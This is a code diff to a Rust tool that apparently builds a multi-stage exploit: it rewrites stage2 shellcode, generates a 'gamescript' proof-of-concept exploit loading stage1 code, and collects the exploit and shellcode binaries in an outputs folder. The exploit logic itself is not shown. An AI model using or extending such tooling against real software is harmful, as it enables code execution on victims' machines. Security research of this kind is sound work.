@@ -16,12 +16,22 @@ fn main() -> Result<()> {
 
     let stage2_path =
         "shellcode_stage2\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage2.exe";
-    rewrite_shellcode(stage2_path)?;
+    let stage2_output = rewrite_shellcode(stage2_path)?;
 
     // generate the exploit code to load the stage1 code
     let gamescript_exploit = generate_gamescript_exploit(&stage1_output)?;
-    let gs_path = "gamescript_poc.txt";
+
+    if !std::path::Path::new("outputs").exists() {
+        std::fs::create_dir("outputs")?;
+    }
+
+    let gs_path = "outputs/gamescript_poc.txt";
     std::fs::write(gs_path, gamescript_exploit.as_bytes())?;
+
+    std::fs::copy(stage1_output, "outputs/stage1.bin")?;
+    std::fs::copy(stage2_output, "outputs/stage2.bin")?;
+
+    println!("done! artifacts can be found in outputs/");
 
     Ok(())
 }
@@ -84,8 +94,6 @@ pub fn rewrite_shellcode(src_path: &str) -> Result<PathBuf> {
             buf_writer.write(&[buffer[i]])?;
         }
         buf_writer.flush().unwrap();
-
-        println!("done! shellcode saved in {dst_path:?}");
     }
 
     Ok(dst_path)
